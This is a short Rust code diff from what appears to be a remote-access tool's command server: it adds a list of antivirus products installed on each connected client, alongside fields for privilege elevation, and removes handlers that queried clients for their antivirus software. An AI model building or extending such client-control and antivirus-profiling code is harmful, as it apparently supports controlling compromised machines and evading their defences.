@@ -375,6 +375,7 @@ impl ServerWrapper {
                             ip: addr.to_string(),
                             disconnected: !self.txs.contains_key(addr),
                             is_elevated: client_info.is_elevated,
+                            installed_avs: client_info.installed_avs.clone(),
                         });
                     }
                     
@@ -396,6 +397,7 @@ impl ServerWrapper {
                             ip: addr.to_string(),
                             disconnected: !self.txs.contains_key(&addr),
                             is_elevated: client_info.is_elevated,
+                            installed_avs: client_info.installed_avs.clone(),
                         };
                         
                         resp.send(Some(front_client)).ok();
@@ -631,27 +633,6 @@ impl ServerWrapper {
                     }
 
                     self.reverse_proxy_tasks.remove(&addr);
-                }
-                GetInstalledAVs(addr) => {
-                    let client = self.connected_users.get(&addr).unwrap();
-                    let message = format!("Run Get Installed AVs on client [{}] [{}]", addr, client.username);
-
-                    self.log_events.log("cmd_sent", &message).await;
-
-                    self.send_client_packet(&addr, ClientboundPacket::GetInstalledAVs).await;
-                }
-                InstalledAVs(addr, av_list) => {
-                    let client = self.connected_users.get(&addr).unwrap();
-                    let message = format!("Received installed AVs from client [{}] [{}]", addr, client.username);
-
-                    self.log_events.log("cmd_rcvd", &message).await;
-
-                    let payload = serde_json::json!({
-                        "addr": addr.to_string(),
-                        "avs": av_list.avs.clone()
-                    });
-
-                    self.emit_serde_payload("installed_avs", payload).await;
                 }
             }
         }
